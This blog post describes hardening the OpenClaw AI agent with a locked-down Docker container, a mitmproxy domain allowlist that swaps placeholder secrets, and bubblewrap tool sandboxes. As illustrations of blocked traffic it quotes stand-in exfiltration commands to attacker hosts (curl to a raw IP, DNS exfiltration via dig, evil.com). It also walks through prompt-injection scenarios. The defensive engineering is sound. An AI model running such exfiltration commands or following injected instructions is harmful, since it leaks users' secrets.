---
title: Declawing my OpenClaw
description: "Hardening OpenClaw with cap-drop: ALL, mitmproxy and bubblewrap"
date: 2026-03-02
tags: ["gen-AI","security","linux"]
---

A few weeks ago I wrote about [The Plumber With A Skeleton Key](/blog/2026/02/10/zero-trust-llm-agent/),
where I argued that giving fully autonomous AI agents unrestricted access to your machine
is roughly as sensible as handing a random stranger on the street the keys to your house,
your car, and your identity.

This post dives into the *how* that goes a little further than a `docker-compose.yml` snippet.

I built [ParanoidClaw](https://github.com/raka-gunarto/paranoidclaw), my own hardened
OpenClaw setup. The goal is simple: keep using the genuinely useful parts of OpenClaw
while assuming it **will** get prompt-injected or hallucinate `rm -rf /` at some point and limiting the damage when it does.

---

### The threat model

To recap, I think of the attack surface in three categories ([original credit](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) to Simon Willison, who I forgot to credit last time)

1. **Access to Data**: Secrets, SSH keys, browser sessions, files on your machine.
2. **Untrusted Input**: Emails, web pages, Slack messages, anything the agent reads that you don't fully control.
3. **Agency**: Shell access, network access, arbitrary code execution.

A stock OpenClaw install on your server / daily driver gives you all three. ParanoidClaw's job is to make each
of those categories as narrow as possible without making the agent useless.

### Container hardening

The first and most obvious layer: don't run OpenClaw on your host machine.

ParanoidClaw runs OpenClaw inside a Docker container with what I'd consider reasonable
hardening. Here's the relevant chunk of the `docker-compose.yml`:

```yaml
openclaw:
    build:
      context: .
      dockerfile: Dockerfile.openclaw-hardened
    user: "65532:65532"
    cap_drop: [ALL]
    security_opt: 
      - no-new-privileges:true
      - seccomp=openclaw-seccomp.json
      - apparmor=openclaw-apparmor
    read_only: true
    init: true
    tmpfs:
      - /tmp:noexec,nosuid,size=64m
    mem_limit: 2G
    cpus: 2.0
    pids_limit: 200
```

| Feature | Purpose |
|---------|---------|
| `user: "65532:65532"` | Runs as unprivileged user; container escape limits attacker access |
| `cap_drop: [ALL]` | Removes all Linux capabilities; no granular root powers available |
| `no-new-privileges: true` | Prevents privilege escalation via SUID binaries |
| `seccomp` and `apparmor` profiles | These are actually slightly relaxed profiles to allow user namespaces for [bwrap sandboxing](#bwrap-tool-sandbox) |
| `read_only: true` | Immutable filesystem; only `/tmp` and volumes are writable |
| `tmpfs` with `noexec,nosuid` | Prevents binary execution and SUID exploitation in temp space |
| `mem_limit: 2G` | Caps memory usage via cgroups |
| `cpus: 2.0` | Limits CPU allocation via cgroups |
| `pids_limit: 200` | Prevent PID exhaustion on host |

The dockerfile itself is minimal, it simply `chown`s the `/app` dir to user 65532.

### Egress proxy: destination filtering

This is the part I'm most satisfied with. Containerisation alone doesn't help you if the
agent can still freely talk to the internet. A prompt-injected agent that can `curl`
your secrets to an attacker-controlled server is still a disaster.

ParanoidClaw routes **all** OpenClaw traffic through
[agent-panopticon](https://github.com/raka-gunarto/agent-panopticon), a custom `mitmproxy`
addon I wrote. The OpenClaw container has no direct network access, all traffic is forced 
through the `mitmproxy` addon via `iptables` rules.

The proxy enforces a strict **domain allowlist**. If OpenClaw tries to reach a domain
that's not on the list, the request gets blocked with a `403`:

```
PANOPTICON: domain 'attacker.com' is not in the egress allowlist.
```

It also blocks direct-IP destinations. No `curl https://123.45.67.89/exfil`. If
it's not a domain on the allowlist, it doesn't leave the box.

DNS queries are filtered too. If the agent tries to resolve a domain not on the allowlist,
it gets an `NXDOMAIN` response. And because mitmproxy resovles the DNS through the host
resolver, no DNS exfiltration through `dig @<attacker-ip> "my-precious-secrets.attacker.com"`

### Egress proxy: in-flight secret substitution

The problem with giving an AI agent API keys: once it has them, a prompt injection
can exfiltrate them. If the API key exists in the context window or if the agent can
read the filesystem to find it, it is a risk.

ParanoidClaw's approach is that **OpenClaw never sees the real secrets**.

Instead of passing actual API keys to OpenClaw, I give it placeholder strings like
`PLACEHOLDER_SECRET_VALUE_ANTHROPIC_KEY`. The agent uses these placeholders in its
requests like normal. When the request passes through the proxy, panopticon does
the swap:

1. OpenClaw makes a request to `api.anthropic.com` with
   `Authorization: Bearer PLACEHOLDER_SECRET_VALUE_ANTHROPIC_KEY`.
2. The proxy checks: is `api.anthropic.com` on the allowlist? Yes.
3. The proxy checks: is `ANTHROPIC_KEY` authorised for `api.anthropic.com`? Yes.
4. It swaps the placeholder for the real key and forwards the request.

If the agent gets injected and tries to send that placeholder to `evil.com`, two things
happen: `evil.com` isn't on the allowlist so the request is blocked, and even if it
were, the placeholder is only authorised for specific domains. The attacker gets a
useless string either way.

This extends to WebSocket messages too, for services like Discord.

The real secrets live only in the proxy's environment (`.env.proxy`), which is a
separate container that OpenClaw cannot access (outside visible filesystem, and
effective user would have no read access either).

### `bwrap` tool sandbox

Containers are great for isolating the main OpenClaw process, but OpenClaw executes 
tools (shell commands, scripts, code) on behalf of the LLM. Those tool executions 
are where prompt injection actually has destructive power. The current setup wraps
the OpenClaw main process, but I also want to ensure the tools can't mess up
OpenClaw configuration or do anything too crazy.

I modified OpenClaw to use [bubblewrap](https://github.com/containers/bubblewrap)
(`bwrap`) as its sandboxing backend for tool executions. `bwrap` uses Linux user
namespaces for unprivileged sandboxing, meaning the OpenClaw process doesn't
need root or any extra privileges. 

Each tool execution gets its own `bwrap` sandbox with:
- A minimal filesystem (only what the tool needs)
- No network access by default
- No access to the filesystem outside the sandbox
- Its own isolated namespace

This means even if a prompt injection tricks the agent into trying to modify
the configuration to trust some random WhatsApp number, it can't, because the
configuration files are not mounted on the containerised root filesystem.

I've opened a [PR on the main OpenClaw repo](https://github.com/openclaw/openclaw/pull/28599)
to get the `bwrap` backend merged.

Note that OpenClaw does provide sandboxing using Docker containers, but that requires
giving the main process access to a Docker daemon. This meant setting up a rootless
Docker daemon if I didn't want a potential escape and host privilege escalation 
through a possible privileged container spawn. `bwrap` is a much lighter solution
in addition to the main process already being containerised.

### Out-of-scope pitfalls

- **LLM hallucination within allowed actions**: If you gave the agent access to your
  email and it hallucinates, it can nuke everything inside the allowed scope.
- **Allowed domain abuse**: If `api.service.com` is allowlisted and the agent is
  injected, it can make arbitrary API calls to that service.

The above are policy issues, not sandboxing problems.

### Is this fully secure?

Nothing is fully secure. This shrinks the blast radius by quite a bit and also
leaves it up to the user to have sane access policies for their agent.

This particular setup also still shares the host kernel, which is trade-off I've accepted.
My server runs its services as docker containers and I wanted to keep this the same
for the OpenClaw service. If you wanted to be extra paranoid, adding an extra boundary
using gVisor or firecracker microVMs would be even safer (or on its own machine).
Technically speaking, a kernel 0day would be bad news for the server this is running on.

### Why bother?

Because I actually want to use these tools (safely)! 

We know prompt injection is a fundamental, possibly unsolvable problem with the current
LLM architecture. We know these agents have shell access and network access. We know
they read untrusted input. The only responsible thing to do is to assume the worst and
build accordingly.

ParanoidClaw is [on GitHub](https://github.com/raka-gunarto/paranoidclaw) if you want
to use it or pick it apart. It's also been a genuinely fun excuse to learn more about
Linux security hardening and networking, which might increase in demand with all these
fully autonomous agents that can execute arbitrary commands on the rise.
